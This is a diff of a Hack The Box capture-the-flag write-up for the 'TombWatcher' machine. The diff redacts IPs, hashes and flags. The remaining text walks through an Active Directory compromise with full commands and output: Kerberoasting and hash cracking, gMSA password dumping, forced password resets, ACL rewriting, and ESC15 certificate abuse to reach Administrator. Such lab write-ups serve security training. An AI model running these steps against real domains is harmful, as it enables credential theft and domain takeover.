@@ -16,9 +16,9 @@ Author: [mrb3n8132](https://app.hackthebox.com/users/2984) and [Sentinal](https:
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.4.76
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 23:43 EDT
-Nmap scan report for 10.129.4.76
+Nmap scan report for 10.129.xx.xx
 Host is up (0.028s latency).
 Not shown: 987 filtered tcp ports (no-response)
 PORT     STATE SERVICE       VERSION
@@ -78,7 +78,7 @@ Nmap done: 1 IP address (1 host up) scanned in 105.21 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.4.76     tombwatcher.htb DC01.tombwatcher.htb
+10.129.xx.xx     tombwatcher.htb DC01.tombwatcher.htb
 ```
 
 This challenge got port 80 open, let's go through and enumerate it.
@@ -150,17 +150,17 @@ Seem like nothing interesting, let's try to enumrate the user `henry`.
 
 ### User Enumeration
 ```bash
-└─$ sudo crackmapexec smb 10.129.4.76 -u henry -p H3nry_987TGV! --users            
-SMB         10.129.4.76     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
-SMB         10.129.4.76     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
-SMB         10.129.4.76     445    DC01             [+] Enumerated domain user(s)
-SMB         10.129.4.76     445    DC01             tombwatcher.htb\john                           badpwdcount: 0 desc: 
-SMB         10.129.4.76     445    DC01             tombwatcher.htb\sam                            badpwdcount: 0 desc: 
-SMB         10.129.4.76     445    DC01             tombwatcher.htb\Alfred                         badpwdcount: 0 desc: 
-SMB         10.129.4.76     445    DC01             tombwatcher.htb\Henry                          badpwdcount: 0 desc: 
-SMB         10.129.4.76     445    DC01             tombwatcher.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
-SMB         10.129.4.76     445    DC01             tombwatcher.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
-SMB         10.129.4.76     445    DC01             tombwatcher.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
+└─$ sudo crackmapexec smb 10.129.xx.xx -u henry -p H3nry_987TGV! --users            
+SMB         10.129.xx.xx     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
+SMB         10.129.xx.xx     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
+SMB         10.129.xx.xx     445    DC01             [+] Enumerated domain user(s)
+SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\john                           badpwdcount: 0 desc: 
+SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\sam                            badpwdcount: 0 desc: 
+SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Alfred                         badpwdcount: 0 desc: 
+SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Henry                          badpwdcount: 0 desc: 
+SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
+SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
+SMB         10.129.xx.xx     445    DC01             tombwatcher.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
 ```
 
 ```bash
@@ -194,7 +194,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                              
-[+] IP: 10.129.4.76:445 Name: tombwatcher.htb           Status: Authenticated
+[+] IP: 10.129.xx.xx:445 Name: tombwatcher.htb           Status: Authenticated
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -209,7 +209,7 @@ Nothing special with SMB, let's move to bloodhound.
 
 ### Bloodhound
 ```bash
-└─$ bloodhound-python -u henry -p H3nry_987TGV! -d tombwatcher.htb -c All -o bloodhound_results.json -ns 10.129.4.76   
+└─$ bloodhound-python -u henry -p H3nry_987TGV! -d tombwatcher.htb -c All -o bloodhound_results.json -ns 10.129.xx.xx   
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: tombwatcher.htb
 INFO: Getting TGT for user
@@ -249,7 +249,7 @@ You can get the tool from [this](https://github.com/ShutdownRepo/targetedKerbero
 [*] Fetching usernames from Active Directory with LDAP
 [VERBOSE] SPN added successfully for (Alfred)
 [+] Printing hash for (Alfred)
-$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e61f18455c53963ec27884741c8fcb48$24048105344113aa9a29a90e3dcea822c663472ab5752d8176cf74ac7e95846c251bcb6602ffb9f62d50d154ab2f6b317261e8bec19d5d1deb8a9ef1ee1996881a21b43e9eac2c57ef27af2f1dede119901bc923943fe142a0334e9d2f55a9c5049328a1b6abda2362f0f62a78375ea947b7188b81941503856cca8c7a4f248435c3dc5193402dccd7d33d0701c7c99de1a600e20696a359338ac376fa9485c31fc563b52ef49be0214f4702076f2722929db24945d68df8a725413fb24afc48ccf6a5139c5ed7711566689b4429cff0e4be0065bb950947545046c6adadb2f7eaf7d098095c51180f8562a2d6621f07606d40c12865b674e1571ba72fa8a89d7c5de9de1cc71409f790285f5e93b53a6443117f59fe0fccc7c65fb0014f73ebe003317ac678f944d3d991fb1e14a922062b771b2ac098d6bc838a7c4259b2850e1a37748ce680ab28d10bf73f3d7d4c168ac8fabc56761dc728605bffec1029505dacadc66ae205ad279d1bfd3e5a07523e1af9f6f27f8a391643c6f53ea4407545038d7cb574a76b96f6488f9419f26f559d4db636b151b09c8cf5030eda934567db6e30154534c9449f273390a5c840653e9ca74ac4947faac32a1b197be8d765a8ddc15751d667427c68f72fdabfe3a0967a62744cd9913d347ac5a5947d2921ea71f3b2010cc7add3a78563d4d87c68e435cbd77d749b8e3dc555dc882feb7765322258ebf17d1985fd06429fbe163a876424f3d7913bf5fbc949271401e3d4a012aa191343fcbe02bdab95027dfb378ae0db6c6a45d0ad5b9416651022f27ebffa9e643096c0a32106dce1c0f26ea08b007f9d36d87f22cf1a0c1dea7a52363b034df9fc137c22df0d7bf6d6c79b880dcb3fcd9f165fe07fa7f047118bd2d97684380b98a76d377753b8f78b40b1608543423611ecca40c107814aa35db7e5385fe0cb67dbbe1c5890b3e52c9465e00d29c29eb22cbeb9e1ffdeef2e54c20900abf53c70c661c04b17ff123622997aacac23d1e217c7dc2518e81da2a5d402e16da4e2fad9099db69ffbf752492c40e5bfb128e449d2e0bc989e0ff003372c76c76ab763f5ab9c5ae999660bcbc6a1822a3dd62fdf97ef43fdbe56dce8844ce1683631ed40c7f3957132bdfd25cab60415df3e3d3986c7495f0fac518574968279bfd366442a84c2b53119f97d92ee4c9ccc4b15b7bcb412d960c0fd8513bd27e850ceef997ba766230f42beadf962223fed2a79a6918a41ee42ae997d8d9867dad8edc76b5a3a87bab3eef5cd0635500f6735ca1c06803fa0ea46b047f8c338c9914136e1c89508d5e0122f62f6366435155783dbccc7834899b44158d35481ceebc5ddb6e22b9449ef93ff59638ea4255e6791b166bbef64d0aba069e599ec5f8652009e444924c65a42cdc6ba27c7aa8159ed1ce34cc7d67e7b99f90df959b78f29a9f3a1a822a449377db0ff3a67210a
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e61f18455c53963ec27884741c8fcb48$<SNIP>
 [VERBOSE] SPN removed successfully for (Alfred)
 ```
 
@@ -261,10 +261,10 @@ hashcat (v6.2.6) starting
 
 ...
 
-$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e61f18455c53963ec27884741c8fcb48$24048105344113aa9a29a90e3dcea822c663472ab5752d8176cf74ac7e95846c251bcb6602ffb9f62d50d154ab2f6b317261e8bec19d5d1deb8a9ef1ee1996881a21b43e9eac2c57ef27af2f1dede119901bc923943fe142a0334e9d2f55a9c5049328a1b6abda2362f0f62a78375ea947b7188b81941503856cca8c7a4f248435c3dc5193402dccd7d33d0701c7c99de1a600e20696a359338ac376fa9485c31fc563b52ef49be0214f4702076f2722929db24945d68df8a725413fb24afc48ccf6a5139c5ed7711566689b4429cff0e4be0065bb950947545046c6adadb2f7eaf7d098095c51180f8562a2d6621f07606d40c12865b674e1571ba72fa8a89d7c5de9de1cc71409f790285f5e93b53a6443117f59fe0fccc7c65fb0014f73ebe003317ac678f944d3d991fb1e14a922062b771b2ac098d6bc838a7c4259b2850e1a37748ce680ab28d10bf73f3d7d4c168ac8fabc56761dc728605bffec1029505dacadc66ae205ad279d1bfd3e5a07523e1af9f6f27f8a391643c6f53ea4407545038d7cb574a76b96f6488f9419f26f559d4db636b151b09c8cf5030eda934567db6e30154534c9449f273390a5c840653e9ca74ac4947faac32a1b197be8d765a8ddc15751d667427c68f72fdabfe3a0967a62744cd9913d347ac5a5947d2921ea71f3b2010cc7add3a78563d4d87c68e435cbd77d749b8e3dc555dc882feb7765322258ebf17d1985fd06429fbe163a876424f3d7913bf5fbc949271401e3d4a012aa191343fcbe02bdab95027dfb378ae0db6c6a45d0ad5b9416651022f27ebffa9e643096c0a32106dce1c0f26ea08b007f9d36d87f22cf1a0c1dea7a52363b034df9fc137c22df0d7bf6d6c79b880dcb3fcd9f165fe07fa7f047118bd2d97684380b98a76d377753b8f78b40b1608543423611ecca40c107814aa35db7e5385fe0cb67dbbe1c5890b3e52c9465e00d29c29eb22cbeb9e1ffdeef2e54c20900abf53c70c661c04b17ff123622997aacac23d1e217c7dc2518e81da2a5d402e16da4e2fad9099db69ffbf752492c40e5bfb128e449d2e0bc989e0ff003372c76c76ab763f5ab9c5ae999660bcbc6a1822a3dd62fdf97ef43fdbe56dce8844ce1683631ed40c7f3957132bdfd25cab60415df3e3d3986c7495f0fac518574968279bfd366442a84c2b53119f97d92ee4c9ccc4b15b7bcb412d960c0fd8513bd27e850ceef997ba766230f42beadf962223fed2a79a6918a41ee42ae997d8d9867dad8edc76b5a3a87bab3eef5cd0635500f6735ca1c06803fa0ea46b047f8c338c9914136e1c89508d5e0122f62f6366435155783dbccc7834899b44158d35481ceebc5ddb6e22b9449ef93ff59638ea4255e6791b166bbef64d0aba069e599ec5f8652009e444924c65a42cdc6ba27c7aa8159ed1ce34cc7d67e7b99f90df959b78f29a9f3a1a822a449377db0ff3a67210a:basketball
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e61f18455c53963ec27884741c8fcb48$<SNIP>:basketxxxx
 ```
 
-Nailed the password `Alfred:basketball`
+Nailed the password `Alfred:basketxxxx`
 
 Back to bloodhound, we saw this path:
 
@@ -273,7 +273,7 @@ Back to bloodhound, we saw this path:
 Saw that we can **AddSelf** to `Infrastructure@tombwatcher.htb` group. Let's get in.
 
 ```bash
-└─$ bloodyAD --host 10.129.4.76 -d tombwatcher.htb -u 'Alfred' -p 'basketball' add groupMember 'Infrastructure' Alfred 
+└─$ bloodyAD --host 10.129.xx.xx -d tombwatcher.htb -u 'Alfred' -p 'basketxxxx' add groupMember 'Infrastructure' Alfred 
 [+] Alfred added to Infrastructure
 ```
 
@@ -288,15 +288,15 @@ Found out this concept from [The Hacker Recipes - Read gMSA password](https://ww
 &rarr; We gonna stick with this one [gMSADumper](https://github.com/micahvandeusen/gMSADumper).
 
 ```bash
-└─$ ./gMSADumper.py -u 'Alfred' -p 'basketball' -d tombwatcher.htb                                                    
+└─$ ./gMSADumper.py -u 'Alfred' -p 'basketxxxx' -d tombwatcher.htb                                                    
 Users or groups who can read password for ansible_dev$:
  > Infrastructure
-ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
+ansible_dev$:::<SNIP>
 ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
 ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a
 ```
 
-Got the password of `ansible_dev$`:`1c37d00093dc2a5f25176bf2d474afdc`. What's next?
+Got the password of `ansible_dev$`:`<SNIP>`. What's next?
 
 ![Bloodhound](/assets/img/tombwatcher-htb-season8/tombwatcher-htb-season8_bloodhound_6.png)
 
@@ -305,7 +305,7 @@ So `ansible_dev$` has **ForceChangePassword** over `sam@tombwatcher.htb`.
 ### ForceChangePassword
 Let's change the password of `sam` to our own.
 ```bash
-└─$ bloodyAD -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' -d tombwatcher.htb --dc-ip 10.129.4.76 set password sam 'P4ssword@123'
+└─$ bloodyAD -u 'ansible_dev$' -p ':<SNIP>' -d tombwatcher.htb --dc-ip 10.129.xx.xx set password sam 'P4ssword@123'
 [+] Password changed successfully!
 ```
 
@@ -510,7 +510,7 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
-4e2610ad31ae97e10d622fe82c136879
+4e2610xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Got the `user.txt` flag.
@@ -591,7 +591,7 @@ New UI from bloodhound and the details is insane. <br>
 Let's abuse to make `john` has full control over `ADCS` on the OU which inherit down to all objects.
 
 ```bash
-└─$ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'P@ssw4rd123' -dc-ip 10.129.169.40
+└─$ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'P@ssw4rd123' -dc-ip 10.129.xx.xx
 /usr/local/bin/dacledit.py:99: SyntaxWarning: invalid escape sequence '\V'
   'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
 /usr/local/bin/dacledit.py:108: SyntaxWarning: invalid escape sequence '\P'
@@ -637,7 +637,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 To double check:
 ```bash
-└─$ dacledit.py -action 'read' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'P@ssw4rd123' -dc-ip 10.129.169.40
+└─$ dacledit.py -action 'read' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'P@ssw4rd123' -dc-ip 10.129.xx.xx
 /usr/local/bin/dacledit.py:99: SyntaxWarning: invalid escape sequence '\V'
   'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
 /usr/local/bin/dacledit.py:108: SyntaxWarning: invalid escape sequence '\P'
@@ -1256,7 +1256,7 @@ So there is vulnerability on [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2
 ## Privilege Escalation
 ### ESC15 - Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019)
 ```bash
-└─$ certipy req -dc-ip 10.129.4.76 -u 'cert_admin@tombwatcher.htb' -p 'passw4rd@123' -target-ip 10.129.4.76 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
+└─$ certipy req -dc-ip 10.129.xx.xx -u 'cert_admin@tombwatcher.htb' -p 'passw4rd@123' -target-ip 10.129.xx.xx -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -1282,15 +1282,15 @@ S-1-5-21-1392491010-1358638721-2126982587-500
 Now we can authenticate via LDAPS using the obtained certificate.
 
 ```powershell
-└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.4.76 -ldap-shell
+└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.xx.xx -ldap-shell
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
 [*]     SAN UPN: 'administrator@tombwatcher.htb'
 [*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
 [*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
-[*] Connecting to 'ldaps://10.129.4.76:636'
-[*] Authenticated to '10.129.4.76' as: 'u:TOMBWATCHER\\Administrator'
+[*] Connecting to 'ldaps://10.129.xx.xx:636'
+[*] Authenticated to '10.129.xx.xx' as: 'u:TOMBWATCHER\\Administrator'
 Type help for list of commands
 
 # 
@@ -1359,7 +1359,7 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-da405370f2892ebec9fda3b2ac963331
+da4053xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `root.txt` flag.
